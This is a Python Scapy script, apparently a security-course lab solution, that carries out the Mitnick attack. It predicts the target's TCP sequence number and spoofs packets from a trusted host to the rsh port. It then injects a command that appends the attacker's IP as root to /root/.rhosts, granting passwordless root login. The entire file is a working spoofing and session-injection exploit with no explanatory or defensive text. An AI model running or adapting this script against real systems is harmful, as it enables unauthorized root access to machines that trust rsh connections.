from scapy.all import *
import sys
import time

def predict_seq(ip, dstPort=514):
    srcPort = 1145
    syn_pkt = IP(dst=ip)/TCP(sport=srcPort, dport=dstPort, flags="S")
    syn_ack = sr1(syn_pkt, timeout=1, verbose=0)

    if syn_ack and TCP in syn_ack:
        seq = syn_ack[TCP].seq
        ack = syn_ack[TCP].ack
        print(f"[+] Got SYN+ACK with SEQ = {seq}")
        rst_pkt = IP(dst=ip)/TCP(sport=srcPort, dport=dstPort, flags="R", seq=ack)
        send(rst_pkt, verbose=0)
        return seq
    else:
        print("[!] No response to SYN")
        return None


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python mitnick.py <iface> <target_ip> <trusted_ip>")
        sys.exit(1)

    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_ip = sys.argv[3]
    attacker_ip = get_if_addr(sys.argv[1])

    predicted_seq = predict_seq(target_ip)
    if predicted_seq:
        predicted_seq += 64000
    else:
        print("[!] Could not predict SEQ.")
        sys.exit(1)

    srcPort = 513
    dstPort = 514

    # Step 1: Spoofed SYN from rimmon
    spoofed_syn = IP(src=trusted_ip, dst=target_ip)/TCP(sport=srcPort, dport=dstPort, flags="S", seq=1000)
    send(spoofed_syn, verbose=0)
    print("[+] Sent spoofed SYN")
    time.sleep(0.5)

    # Step 2: ACK response (no payload)
    spoofed_ack = IP(src=trusted_ip, dst=target_ip)/TCP(
        sport=srcPort, dport=dstPort, flags="A", seq=1001, ack=predicted_seq + 1
    )
    send(spoofed_ack, verbose=0)
    print("[+] Sent spoofed ACK")
    # time.sleep(0.5)

    # Step 3: Send command as separate PSH+ACK
    payload = f"0\0root\0root\0echo '{attacker_ip} root' >> /root/.rhosts\0"
    spoofed_cmd = IP(src=trusted_ip, dst=target_ip)/TCP(
        sport=srcPort, dport=dstPort, flags="PA", seq=1001, ack=predicted_seq + 1
    ) / Raw(load=payload)
    send(spoofed_cmd, verbose=0)
    print("[+] Sent command")
    time.sleep(5)

    # Step 4: End session
    rst_pkt = IP(src=trusted_ip, dst=target_ip)/TCP(sport=srcPort, dport=dstPort, flags="R", seq=1003)
    send(rst_pkt, verbose=0)
    print("[+] Sent spoofed RST")


# python3 cp2.2.mitnick.py eth0 10.4.61.25 72.36.89.200
# rsh 10.4.61.25 uname -ns
